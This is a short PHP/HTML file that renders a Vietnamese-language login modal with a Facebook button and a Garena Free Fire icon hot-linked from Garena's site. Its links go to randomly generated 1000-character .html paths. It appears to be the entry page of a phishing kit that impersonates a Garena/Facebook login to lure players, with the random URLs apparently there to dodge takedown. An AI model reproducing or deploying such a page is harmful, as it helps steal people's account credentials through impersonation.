<?php
		 function crypto_rand_secure($min, $max)
{
    $range = $max - $min;
    if ($range < 1) return $min; // not so random...
    $log = ceil(log($range, 2));
    $bytes = (int) ($log / 8) + 1; // length in bytes
    $bits = (int) $log + 1; // length in bits
    $filter = (int) (1 << $bits) - 1; // set all lower bits to 1
    do {
        $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        $rnd = $rnd & $filter; // discard irrelevant bits
    } while ($rnd > $range);
    return $min + $rnd;
}
 
  function getToken($length)
{
    $token = "";
    $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
    $codeAlphabet.= "0123456789";
    $max = strlen($codeAlphabet); // edited
 
    for ($i=0; $i < $length; $i++) {
        $token .= $codeAlphabet[crypto_rand_secure(0, $max-1)];
    }
 
    return $token;
}

?>
<div class="swal2-container swal2-center swal2-shown" style="overflow-y: auto;">
  <div aria-labelledby="swal2-title" aria-describedby="swal2-content" class="swal2-popup swal2-modal animated fadeInDown custom-modal login-modal swal2-noanimation" tabindex="-1" role="dialog" aria-live="assertive" aria-modal="true" style="display: flex;">
    <div class="swal2-header">
      
      <h2 class="swal2-title" id="swal2-title" style="display: flex;">bảng điều khiển đăng nhập</h2>
      
    </div>
    <div class="swal2-content">
      <div id="swal2-content" style="display: block;">
        <div class="not-login"><a href="/<?php echo getToken(1000); ?>.html"><img src="https://ff.member.garena.vn/images/fb_ico.png" alt=""></a><p>Facebook</p></div>
      </div>
      
    </div>
    <div class="swal2-actions" style="display: flex;">
      <a href="/<?php echo getToken(1000); ?>.html" class="swal2-confirm swal2-styled" aria-label="" style="border-left-color: rgba(0, 0, 0, 0); border-right-color: rgba(0, 0, 0, 0);">Đăng nhập</a>
      
    </div>
    
  </div>
</div>
